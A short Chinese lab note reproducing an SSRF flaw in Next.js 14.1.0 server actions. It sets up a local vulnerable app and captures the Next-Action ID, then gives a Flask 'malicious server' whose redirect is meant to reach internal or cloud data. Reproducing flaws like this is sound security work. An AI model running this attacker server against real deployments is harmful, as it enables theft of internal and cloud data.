- Next.js -ssrf
## 漏洞分析
- https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps?ref=assetnote.io

## 本地复现

### 创建有漏洞的nextjs应用
```bash
npx create-next-app@14.1.0 vulnerable-app
cd vulnerable-app
```

#### 创建有漏洞的服务端动作

在 `app/actions.ts` 中添加：
```js
"use server";

import { redirect } from "next/navigation";

export const handleSearch = async (data: FormData) => {
  // 模拟用户未登录状态
  redirect("/login");
};
```

#### 创建测试页面

在 `app/page.tsx` 中添加：
```js
import { handleSearch } from './actions';

export default function Home() {
  return (
    <form action={handleSearch}>
      <button type="submit">测试漏洞</button>
    </form>
  );
}
```

#### 启动应用

`npm run dev`


### 获取Nextt-Action ID

1. 访问 `http://localhost:3000`
2. Burp抓包拦截
3. 点击 "测试漏洞" 按钮
4. 在请求头中找到 `Next-Action` 的值（如 `15531bfa07ff11369239544516d26edbc537ff9c`）


### 启动恶意服务 -ssrf

```python
from flask import Flask, Response, request, redirect

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['HEAD', 'GET'])
def catch(path):
    print(f"Received {request.method} request for {request.url}")
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('http://baidu.com') // 内网数据 / 云数据等等

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8081)

```

![](media/Pasted%20image%2020250713203556.png)  

